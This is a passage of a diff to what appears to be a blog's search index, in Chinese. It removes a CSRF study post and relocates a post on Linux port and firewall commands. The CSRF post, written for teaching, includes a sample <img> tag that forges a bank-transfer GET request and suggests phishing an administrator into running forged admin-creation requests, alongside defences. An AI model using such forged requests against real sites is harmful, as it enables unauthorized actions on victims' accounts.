-      </tags>
-  </entry>
-  <entry>
-    <title>常见web漏洞学习之CSRF</title>
-    <url>/2021/07/14/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BCSRF/</url>
-    <content><![CDATA[<h1 id="csrf学习"><a href="#csrf学习" class="headerlink" title="csrf学习"></a>csrf学习</h1><p>跨站请求伪造</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或访问包含攻击代码的页面（钓鱼），在受害者不知情的情况下以受害者的身份向发送请求，从而完成非法操作。</p>
-<p>CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全</p>
-<blockquote>
-<p>与XSS最大区别就是csrf并没有盗取cookie而是直接利用</p>
-</blockquote>
-<p>图里解释很清楚了，就不赘述了</p>
-<p><img src="https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="img"></p>
-<p>还是老生常谈的银行转账的问题</p>
-<p>已知受害者在银行以GET请求来完成银行转账的操作，<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code></p>
-<p>而攻击者构造的代码是</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.mybank.com/Transfer.php?toBankId</span>=<span class="string">11&amp;money</span>=<span class="string">1000</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>当受害者登录银行，然后被钓鱼或是诱导点击了攻击者的链接，这样<img>以GET的方式进行了转账操作</p>
-<p>后面改进的示例就不列举了，大概总结就是<code>$_REQUEST</code>既可以获取get请求的数据，也可以获取post请求的数据，当后台使用<code>$_REQUEST</code>获取数据时还是存在无法区分</p>
-<blockquote>
-<p>在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题</p>
-</blockquote>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>最好是有目标站点的CMS，在本地搭建并构造一下例如创建管理员，开放权限等数据包，通过钓鱼等手段诱导管理员点击，执行数据包；要是没有目标站点的cms，也可以尝试抓包构造一下，不过有一定难度</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是<strong>来自于某个用户的浏览器</strong>，但却<strong>无法保证该请求是用户批准发送的</strong></p>
-<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h4 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h4><ol>
-<li>验证http referer字段</li>
-</ol>
-<p>referer就是记录了请求的来源（同源策略）</p>
-<blockquote>
-<p>然而，这种方法并非万无一失。Referer  的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer  的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer  值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全</p>
-</blockquote>
-<p>因为服务器并不是什么时候都能取到Referer，也可以通过抓包修改进行绕过，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法</p>
-<h4 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h4><ol start="2">
-<li>添加token并验证</li>
-</ol>
-<p>一致的做法是使用一个token（<strong>Anti CSRF Token</strong>）</p>
-<p>用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求</p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅谈CSRF攻击方式</a></p>
-<p><a href="https://www.cnblogs.com/lsj-info/p/9479755.html">CSRF攻击原理以及防御方法</a></p>
-]]></content>
-      <categories>
-        <category>csrf</category>
-      </categories>
-      <tags>
-        <tag>csrf</tag>
       </tags>
   </entry>
   <entry>
@@ -1824,38 +1842,6 @@
       <tags>
         <tag>文件上传</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>端口那些事</title>
-    <url>/2021/06/28/%E7%AB%AF%E5%8F%A3%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
-    <content><![CDATA[<p>想要开放端口，要先去了解防火墙状态和网络命令</p>
-<h2 id="centos下"><a href="#centos下" class="headerlink" title="centos下"></a>centos下</h2><h3 id="查看已经开放的所有端口"><a href="#查看已经开放的所有端口" class="headerlink" title="查看已经开放的所有端口"></a>查看已经开放的所有端口</h3><p> <code>netstat -anp</code></p>
-<h3 id="查看端口被哪个服务占用"><a href="#查看端口被哪个服务占用" class="headerlink" title="查看端口被哪个服务占用"></a>查看端口被哪个服务占用</h3><p><code>netstat -anp | grep 端口号</code></p>
-<h3 id="查看防火墙状态"><a href="#查看防火墙状态" class="headerlink" title="查看防火墙状态"></a>查看防火墙状态</h3><p><code>systemctl status firewalld</code></p>
-<p><img src="https://i.loli.net/2021/07/05/qgC2dVhBQRUEc84.png" alt="image-20210705163816093"></p>
-<p><img src="https://i.loli.net/2021/07/05/d5mTi73gSVhyGMP.png" alt="image-20210705095620194"></p>
-<h3 id="查看进程的详细信息"><a href="#查看进程的详细信息" class="headerlink" title="查看进程的详细信息"></a>查看进程的详细信息</h3><p> <code>ps PID</code></p>
-<p><img src="https://i.loli.net/2021/07/05/GEUzN6YjfeWwgO7.png"></p>
-<h3 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h3><p> <code>kill -9 PID</code></p>
-<h3 id="开启-关闭防火墙："><a href="#开启-关闭防火墙：" class="headerlink" title="开启/关闭防火墙："></a>开启/关闭防火墙：</h3><p><code>systemctl start/stop firewalld</code></p>
-<h3 id="查看防火墙所有开放的端口："><a href="#查看防火墙所有开放的端口：" class="headerlink" title="查看防火墙所有开放的端口："></a>查看防火墙所有开放的端口：</h3><p><code>firewall-cmd --zone=public --list-ports</code></p>
-<p><img src="https://i.loli.net/2021/07/05/T7Vr2jNFoUflEWb.png" alt="image-20210705162443473"></p>
-<h3 id="查看某一端口是否开放："><a href="#查看某一端口是否开放：" class="headerlink" title="查看某一端口是否开放："></a>查看某一端口是否开放：</h3><p><code>firewall-cmd --query-port=端口/tcp</code></p>
-<p><img src="https://i.loli.net/2021/07/05/F7jXHMA5IsGNnwx.png" alt="image-20210705163024044"></p>
-<h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p><code>firewall-cmd --add-port=端口号/tcp --permanent</code></p>
-<h3 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h3><p><code>firewall-cmd --permanent --remove-port=端口号/tcp</code></p>
-<p><img src="https://i.loli.net/2021/08/19/87XlK9j1esyLfGR.png" alt="image-20210819175722813"></p>
-<h2 id="ubuntu-下还略有不同"><a href="#ubuntu-下还略有不同" class="headerlink" title="ubuntu 下还略有不同"></a>ubuntu 下还略有不同</h2><h3 id="查看防火墙当前状态"><a href="#查看防火墙当前状态" class="headerlink" title="查看防火墙当前状态"></a>查看防火墙当前状态</h3><p><code>ufw status</code></p>
-<p><img src="https://i.loli.net/2021/07/05/RMgqjh9wQPKvmS6.png" alt="image-20210705180504549"></p>
-<h3 id="开启-关闭防火墙"><a href="#开启-关闭防火墙" class="headerlink" title="开启/关闭防火墙"></a>开启/关闭防火墙</h3><p><code>ufw enable/disable</code></p>
-<h3 id="查看防火墙版本"><a href="#查看防火墙版本" class="headerlink" title="查看防火墙版本"></a>查看防火墙版本</h3><p><code>ufw version</code></p>
-<h3 id="开放某一端口"><a href="#开放某一端口" class="headerlink" title="开放某一端口"></a>开放某一端口</h3><p><code>ufw allow 端口号</code></p>
-<h3 id="禁止某一端口"><a href="#禁止某一端口" class="headerlink" title="禁止某一端口"></a>禁止某一端口</h3><p><code>ufw delete allow  端口号</code>或是<code>ufw deny 端口号</code></p>
-<h3 id="允许-拒绝外部访问本机"><a href="#允许-拒绝外部访问本机" class="headerlink" title="允许/拒绝外部访问本机"></a>允许/拒绝外部访问本机</h3><p><code>ufw default allow/deny</code></p>
-<h3 id="允许某一网段的ip进行访问"><a href="#允许某一网段的ip进行访问" class="headerlink" title="允许某一网段的ip进行访问"></a>允许某一网段的ip进行访问</h3><p><code>ufw allow from 10.0.0.0/8</code></p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/realjh/article/details/82048492">Linux下Centos7对外开放端口</a></p>
-<p><a href="https://www.cnblogs.com/heqiuyong/p/10460150.html">Centos7开放及查看端口</a></p>
-]]></content>
   </entry>
   <entry>
     <title>spring</title>
@@ -2835,5 +2821,37 @@
       <tags>
         <tag>sql</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>端口那些事</title>
+    <url>/2021/06/28/%E7%AB%AF%E5%8F%A3%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
+    <content><![CDATA[<p>想要开放端口，要先去了解防火墙状态和网络命令</p>
+<h2 id="centos下"><a href="#centos下" class="headerlink" title="centos下"></a>centos下</h2><h3 id="查看已经开放的所有端口"><a href="#查看已经开放的所有端口" class="headerlink" title="查看已经开放的所有端口"></a>查看已经开放的所有端口</h3><p> <code>netstat -anp</code></p>
+<h3 id="查看端口被哪个服务占用"><a href="#查看端口被哪个服务占用" class="headerlink" title="查看端口被哪个服务占用"></a>查看端口被哪个服务占用</h3><p><code>netstat -anp | grep 端口号</code></p>
+<h3 id="查看防火墙状态"><a href="#查看防火墙状态" class="headerlink" title="查看防火墙状态"></a>查看防火墙状态</h3><p><code>systemctl status firewalld</code></p>
+<p><img src="https://i.loli.net/2021/07/05/qgC2dVhBQRUEc84.png" alt="image-20210705163816093"></p>
+<p><img src="https://i.loli.net/2021/07/05/d5mTi73gSVhyGMP.png" alt="image-20210705095620194"></p>
+<h3 id="查看进程的详细信息"><a href="#查看进程的详细信息" class="headerlink" title="查看进程的详细信息"></a>查看进程的详细信息</h3><p> <code>ps PID</code></p>
+<p><img src="https://i.loli.net/2021/07/05/GEUzN6YjfeWwgO7.png"></p>
+<h3 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h3><p> <code>kill -9 PID</code></p>
+<h3 id="开启-关闭防火墙："><a href="#开启-关闭防火墙：" class="headerlink" title="开启/关闭防火墙："></a>开启/关闭防火墙：</h3><p><code>systemctl start/stop firewalld</code></p>
+<h3 id="查看防火墙所有开放的端口："><a href="#查看防火墙所有开放的端口：" class="headerlink" title="查看防火墙所有开放的端口："></a>查看防火墙所有开放的端口：</h3><p><code>firewall-cmd --zone=public --list-ports</code></p>
+<p><img src="https://i.loli.net/2021/07/05/T7Vr2jNFoUflEWb.png" alt="image-20210705162443473"></p>
+<h3 id="查看某一端口是否开放："><a href="#查看某一端口是否开放：" class="headerlink" title="查看某一端口是否开放："></a>查看某一端口是否开放：</h3><p><code>firewall-cmd --query-port=端口/tcp</code></p>
+<p><img src="https://i.loli.net/2021/07/05/F7jXHMA5IsGNnwx.png" alt="image-20210705163024044"></p>
+<h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p><code>firewall-cmd --add-port=端口号/tcp --permanent</code></p>
+<h3 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h3><p><code>firewall-cmd --permanent --remove-port=端口号/tcp</code></p>
+<p><img src="https://i.loli.net/2021/08/19/87XlK9j1esyLfGR.png" alt="image-20210819175722813"></p>
+<h2 id="ubuntu-下还略有不同"><a href="#ubuntu-下还略有不同" class="headerlink" title="ubuntu 下还略有不同"></a>ubuntu 下还略有不同</h2><h3 id="查看防火墙当前状态"><a href="#查看防火墙当前状态" class="headerlink" title="查看防火墙当前状态"></a>查看防火墙当前状态</h3><p><code>ufw status</code></p>
+<p><img src="https://i.loli.net/2021/07/05/RMgqjh9wQPKvmS6.png" alt="image-20210705180504549"></p>
+<h3 id="开启-关闭防火墙"><a href="#开启-关闭防火墙" class="headerlink" title="开启/关闭防火墙"></a>开启/关闭防火墙</h3><p><code>ufw enable/disable</code></p>
+<h3 id="查看防火墙版本"><a href="#查看防火墙版本" class="headerlink" title="查看防火墙版本"></a>查看防火墙版本</h3><p><code>ufw version</code></p>
+<h3 id="开放某一端口"><a href="#开放某一端口" class="headerlink" title="开放某一端口"></a>开放某一端口</h3><p><code>ufw allow 端口号</code></p>
+<h3 id="禁止某一端口"><a href="#禁止某一端口" class="headerlink" title="禁止某一端口"></a>禁止某一端口</h3><p><code>ufw delete allow  端口号</code>或是<code>ufw deny 端口号</code></p>
+<h3 id="允许-拒绝外部访问本机"><a href="#允许-拒绝外部访问本机" class="headerlink" title="允许/拒绝外部访问本机"></a>允许/拒绝外部访问本机</h3><p><code>ufw default allow/deny</code></p>
+<h3 id="允许某一网段的ip进行访问"><a href="#允许某一网段的ip进行访问" class="headerlink" title="允许某一网段的ip进行访问"></a>允许某一网段的ip进行访问</h3><p><code>ufw allow from 10.0.0.0/8</code></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/realjh/article/details/82048492">Linux下Centos7对外开放端口</a></p>
+<p><a href="https://www.cnblogs.com/heqiuyong/p/10460150.html">Centos7开放及查看端口</a></p>
+]]></content>
   </entry>
 </search>
